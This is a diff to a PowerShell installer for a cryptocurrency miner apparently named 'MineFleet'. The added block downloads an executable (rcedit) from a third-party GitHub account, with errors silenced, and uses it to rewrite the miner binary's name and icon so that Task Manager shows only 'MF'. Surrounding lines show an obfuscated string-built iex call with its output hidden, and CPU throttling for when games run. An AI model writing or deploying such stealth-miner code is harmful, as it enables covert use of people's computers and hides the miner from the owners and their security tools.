@@ -288,7 +288,68 @@ if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
     try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
 }
 
-# ---- TWO CONFIGS: NORMAL (30%) + LIGHT (15% for games) ----
+# ---- BRANDING (rename Task Manager appearance to MF) ----
+Show ".." "Applying MineFleet branding..."
+try {
+    # Create white box icon (32x32 whitish square)
+    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
+    $icoPath = "$BASE\mf.ico"
+    if (-not (Test-Path $icoPath)) {
+        $bmp = New-Object System.Drawing.Bitmap(32, 32)
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(235, 235, 240))
+        $g.FillRectangle($brush, 0, 0, 32, 32)
+        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(200, 200, 210), 1)
+        $g.DrawRectangle($pen, 0, 0, 31, 31)
+        $font = New-Object System.Drawing.Font("Arial", 11, [System.Drawing.FontStyle]::Bold)
+        $textBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80, 80, 90))
+        $sf = New-Object System.Drawing.StringFormat
+        $sf.Alignment = [System.Drawing.StringAlignment]::Center
+        $sf.LineAlignment = [System.Drawing.StringAlignment]::Center
+        $g.DrawString("MF", $font, $textBrush, [System.Drawing.RectangleF]::new(0, 0, 32, 32), $sf)
+        $g.Dispose()
+        $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
+        $fs = [System.IO.FileStream]::new($icoPath, 'Create')
+        $icon.Save($fs)
+        $fs.Close()
+        $bmp.Dispose()
+    }
+
+    # Download rcedit to rebrand the binary
+    $rceditPath = "$env:TEMP\rcedit-x64.exe"
+    if (-not (Test-Path $rceditPath)) {
+        $rceditUrl = "https://github.com/nicedayto/rcedit/releases/download/v2.0.0/rcedit-x64.exe"
+        Invoke-WebRequest $rceditUrl -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+        if (-not (Test-Path $rceditPath)) {
+            # Fallback URL
+            Invoke-WebRequest "https://github.com/nicedayto/rcedit/releases/latest/download/rcedit-x64.exe" -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+        }
+    }
+
+    if (Test-Path $rceditPath) {
+        # Stop miner before modifying binary
+        Get-Process -Name "MF" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+        Start-Sleep 2
+
+        # Apply branding
+        & $rceditPath $BINARY --set-version-string "FileDescription" "MF" 2>$null
+        & $rceditPath $BINARY --set-version-string "ProductName" "MF" 2>$null
+        & $rceditPath $BINARY --set-version-string "OriginalFilename" "MF.exe" 2>$null
+        & $rceditPath $BINARY --set-version-string "InternalName" "MF" 2>$null
+        if (Test-Path $icoPath) {
+            & $rceditPath $BINARY --set-icon $icoPath 2>$null
+        }
+
+        # Cleanup rcedit
+        Remove-Item $rceditPath -Force -ErrorAction SilentlyContinue
+        Show "OK" "Branding applied: Task Manager shows 'MF' with custom icon"
+    } else {
+        Show "!!" "Branding tool unavailable (Task Manager will show filename MF.exe)"
+    }
+} catch {
+    Show "!!" "Branding partial (Task Manager will show filename MF.exe)"
+}
+
 Show ".." "Creating smart CPU configurations..."
 $logEscaped = $LOGFILE -replace '\\','\\'
 
